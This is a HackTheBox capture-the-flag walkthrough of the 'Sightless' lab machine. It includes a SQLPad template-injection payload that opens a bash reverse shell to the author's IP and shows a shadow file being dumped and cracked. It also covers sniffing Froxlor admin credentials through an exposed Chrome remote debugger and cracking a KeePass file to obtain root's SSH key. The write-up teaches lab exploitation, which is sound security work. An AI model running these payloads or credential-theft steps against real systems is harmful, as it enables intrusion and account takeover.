---
title: "HackTheBox - Sightless"
author: Nasrallah
description: ""
date: 07:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, tunneling, sql, cve, rce, ftp, keepass, john cracking]
img_path: /assets/img/hackthebox/machines/sightless
image:
    path: sightless.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

[Sightless](https://hacktheboxltd.sjv.io/Nasrallah?u=https://app.hackthebox.com/machines/sightless) from [HackTheBox](https://hacktheboxltd.sjv.io/anqPJZ) has a version of SQLPad vulnerable to SSTI that we exploit to get a shell on a container as root, we dump the shadow file and crack the password of one user to get ssh access into the host machine. After that we find an instance of `Froxlor` running locally with remote debugging on, We exploit that to sniff the administrator's password, we login and change the ftp password, on that we find a keepass db file where we find an ssh private key of root.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.32
Host is up (0.41s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://sightless.htb/

```

We found 3 open ports, 21 is FTP, 22 is SSH and 80 is an apache web server.

### Web

The nmap script reveals the `sightless.htb` domain, let's add that to `/etc/hosts` file and navigate to the website.

![webiste](1.png)

Scrolling down we come across the services section, we see that `SQLPad` is going to `sqlpad.sightless.htb` domain, let's add that to `/etc/hosts`.

![sqpad](2.png)

Searching on google for possible exploits we come across this bug bounty [report](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb)

## **Foothold**

To get a shell we follow the following steps.

- Navigate to `http://sqlpad.sightless.htb`
- Click on Connections->Add connection
- Choose MySQL as the driver
- Input the following payload into the Database form field

`{{ process.mainModule.require('child_process').exec('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.20/9001 0>&1"') }}`

We setup a listener and click `Test` button.

![shell](3.png)

```terminal
[★]$ nc -lvnp 9001                                                                         
listening on [any] 9001 ...                                                      
connect to [10.10.16.20] from (UNKNOWN) [10.10.11.32] 57094                                    
bash: cannot set terminal process group (1): Inappropriate ioctl for device                    
bash: no job control in this shell                                                             
root@c184118df0a6:/var/lib/sqlpad# script -qc /bin/bash /dev/null                              
script -qc /bin/bash /dev/null                                                   
root@c184118df0a6:/var/lib/sqlpad# export TERM=xterm                                           
export TERM=xterm                                                                              
root@c184118df0a6:/var/lib/sqlpad# ^Z                                                          
zsh: suspended  nc -lvnp 9001

┌──[10.10.16.20]─[sirius💀parrot]-[~/ctf/htb/sighless]
└──╼[★]$ stty raw -echo;fg                   
[1]  + continued  nc -lvnp 9001

root@c184118df0a6:/var/lib/sqlpad# id
uid=0(root) gid=0(root) groups=0(root)
```

We got root but it's clearly a docker container of sqlpad.

## **Privilege Escalation**

### Escaping docker

Since we are root we can read the `/etc/shadow` file.

```text
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
```

We got the hash of user `machael`, let's crack it.

```terminal
hashcat hashes.txt rockyou.txt -m 1800
hashcat (v6.2.6) starting




Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:insaneclownposse

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa....L2IJD/
Time.Started.....: Mon Dec 16 10:43:14 2024 (29 secs)
Time.Estimated...: Mon Dec 16 10:43:43 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     2285 H/s (10.91ms) @ Accel:128 Loops:4 Thr:256 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 65536/14344384 (0.46%)
Rejected.........: 0/65536 (0.00%)
Restore.Point....: 32768/14344384 (0.23%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4996-5000
Candidate.Engine.: Device Generator
Candidates.#1....: dumbo -> ryanscott

Started: Mon Dec 16 10:43:06 2024
Stopped: Mon Dec 16 10:43:45 2024
```

We got the password `insaneclownposse`. Let's try ssh to the box.

```terminal
[★]$ ssh michael@sightless.htb
The authenticity of host 'sightless.htb (10.10.11.32)' can't be established.
ED25519 key fingerprint is SHA256:L+MjNuOUpEDeXYX6Ucy5RCzbINIjBx2qhJQKjYrExig.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'sightless.htb' (ED25519) to the list of known hosts.
michael@sightless.htb's password: 
Last login: Tue Sep  3 11:52:02 2024 from 10.10.14.23
michael@sightless:~$ id
uid=1000(michael) gid=1000(michael) groups=1000(michael)
```

### Michael -> root

This part is a long process

After running linpeas we find multiple ports open locally.

```terminal
╔══════════╣ Active Ports                                                        
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports    
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:38603         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:40601         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:60451         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::21                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

Also linpeas shows that chrome is running with [remote debugging](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/).

![remote](4.png)

This will allow us to read sensitive data.

First we need to identify what port is running the remote debugger. It's deferent every time.

```terminal
michael@sightless:/tmp$ netstat -tulpn 2>/dev/null | grep 127 | awk '{print $4}'
127.0.0.1:44053
127.0.0.1:60579
127.0.0.1:3306
127.0.0.1:8080
127.0.0.1:33060
127.0.0.1:45177
127.0.0.1:3000
127.0.0.53:53
127.0.0.53:53

michael@sightless:/tmp$ curl 127.0.0.1:60579/json
{"value":{"error":"unknown command","message":"unknown command: unknown command: json","stacktrace":"#0 0x562196871e43 \u003Cunknown>\n#1 0x5621965604e7 \u003Cunknown>\n#2 0x5621965c76b2 \u003Cunknown>\n#3 0x5621965c718f \u003Cunknown>\n#4 0x56219652ca18 \u003Cunknown>\n#5 0x56219683616b \u003Cunknown>\n#6 0x56219683a0bb \u003Cunknown>\n#7 0x562196822281 \u003Cunknown>\n#8 0x56219683ac22 \u003Cunknown>\n#9 0x56219680713f \u003Cunknown>\n#10 0x56219652b027 \u003Cunknown>\n#11 0x7f6cc0778d90 \u003Cunknown>\n"}}michael@sightless:/tmp$ 

michael@sightless:/tmp$ curl 127.0.0.1:45177/json
[ {
   "description": "",
   "devtoolsFrontendUrl": "/devtools/inspector.html?ws=127.0.0.1:45177/devtools/page/14FEC47C4AA591DFAE5ADE395BDDF71A",
   "id": "14FEC47C4AA591DFAE5ADE395BDDF71A",
   "title": "Froxlor",
   "type": "page",
   "url": "http://admin.sightless.htb:8080/admin_logger.php?page=log",
   "webSocketDebuggerUrl": "ws://127.0.0.1:45177/devtools/page/14FEC47C4AA591DFAE5ADE395BDDF71A"
} ]

```

Here we see the debugger is running on port 45177 debuggin the froxlor application running on port 8080, let's forward that port.

```bash
ssh -L 45177:127.0.0.1:45177 michael@sightless.htb
```

Now we open chromium, navigate to `chrome://inspect/#devices`, we click on `configure` and add the `127.0.0.1:45177`

![add](5.png)

We click done and we see some activity, we click inspect.

![frox](6.png)

Now we have the debugger for port 8080.

![debug](7.png)

On the network tab we select `All` and after we catch a login we click `stop recording` button on top left.

We select `index.php` and navigate to `payloads` tab.

![pass](8.png)

We got credentials for froxlor. Le's now forward the 8080 port.

```bash
ssh -L 8000:127.0.0.1:8080 michael@sightless.htb
```

Now we navigate to `http://127.0.0.1:8000/` and login with the credentials `admin:ForlorfroxAdmin`

![forxlor](9.png)

Now we got to `Resources` and `customers` and click on `Web1`.

![web1](10.png)

No we go to `FTP` -> `Accounts` and click on edit button.

![edit](11.png)

Now we can change the password for this ftp user.

![passftp](12.png)

Now let's login to the ftp server.

```terminal
[★]$ ftp 10.10.11.32                 
Connected to 10.10.11.32.
220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
Name (10.10.11.32:sirius): web1
550 SSL/TLS required on the control channel
ftp: Login failed
```

The server only accepts ssl connection, we can use `ftp-ssl`.

```terminal
[★]$ ftp-ssl sightless.htb         
Connected to sightless.htb.
220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
Name (sightless.htb:sirius): web1
234 AUTH TLS successful
[SSL Cipher TLS_AES_256_GCM_SHA384]
200 PBSZ 0 successful
200 Protection set to Private
[Encrypted data transfer.]
331 Password required for web1
Password:
230 User web1 logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 web1     web1         4096 May 17  2024 goaccess
-rw-r--r--   1 web1     web1         8376 Mar 29  2024 index.html
226 Transfer complete
ftp> cd goaccess
250 CWD command successful
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 web1     web1         4096 Aug  2 07:14 backup
226 Transfer complete
ftp> cd backup
250 CWD command successful
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 web1     web1         5292 Aug  6 14:29 Database.kdb
226 Transfer complete
ftp> get Database.kdb
local: Database.kdb remote: Database.kdb
200 PORT command successful
150 Opening BINARY mode data connection for Database.kdb (5292 bytes)
226 Transfer complete
5292 bytes received in 0.37 secs (14.0138 kB/s)
```

We logged in successfully, and found a `keepass` db file.

We download the file to our box and open it.

The file has a password as expected, we can use `keepass2john` to get the hash of that pass and then crack it.

```terminal
┌──[10.10.16.20]─[sirius💀parrot]-[~/ctf/htb/sighless]
└──╼[★]$ keepass2john Database.kdb > hash
[sudo] password for sirius: 
Inlining Database.kdb
                                                                                                                                                                                              
┌──[10.10.16.20]─[sirius💀parrot]-[~/ctf/htb/sighless]
└──╼[★]$ john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 600000 for all loaded hashes
Cost 2 (version) is 1 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bulldogs         (Database.kdb)     
1g 0:00:00:42 DONE (2024-12-19 11:36) 0.02380g/s 24.75p/s 24.75c/s 24.75C/s kucing..pisces
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We got the password, now I used `keepassxc` to open the file.

The file is `keepass db 1` so I had to go to `Database` -> `Import` -> `Keepass 1 Database`

![kee](13.png)

I found the root's password but it didn't work.

The database contains an attachment.

![id](14.png)

It's an id_rsa file, let's download it and connect with it.

```terminal
$ ssh -i id_rsa root@sightless.htb
Load key "id_rsa": error in libcrypto
```

We got an error about libcrypto.

Searching for this error on google we came across [stackexchange page](https://unix.stackexchange.com/questions/577402/ssh-error-while-logging-in-using-private-key-loaded-pubkey-invalid-format-and).

Some one suggests using the following commands to solve the issue.

```terminal
dos2unix ~/.ssh/id_rsa
vim --clean ~/.ssh/id_rsa
```

Then exit vim with `:wq`.

I tried that and it worked.

```terminal
┌──[10.10.16.20]─[sirius💀parrot]-[~/ctf/htb]
└──╼[★]$ dos2unix id_rsa                 
dos2unix: converting file id_rsa to Unix format...
                                                                                                                                                                                              
┌──[10.10.16.20]─[sirius💀parrot]-[~/ctf/htb]
└──╼[★]$ vim --clean id_rsa              
                                                                                                                                                                                              
┌──[10.10.16.20]─[sirius💀parrot]-[~/ctf/htb]
└──╼[★]$ ssh -i id_rsa root@sightless.htb
Last login: Thu Dec 19 09:57:07 2024 from 10.10.16.20
root@sightless:~# id
uid=0(root) gid=0(root) groups=0(root)
root@sightless:~#
```

## **References**

<https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb>

<https://unix.stackexchange.com/questions/577402/ssh-error-while-logging-in-using-private-key-loaded-pubkey-invalid-format-and>

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
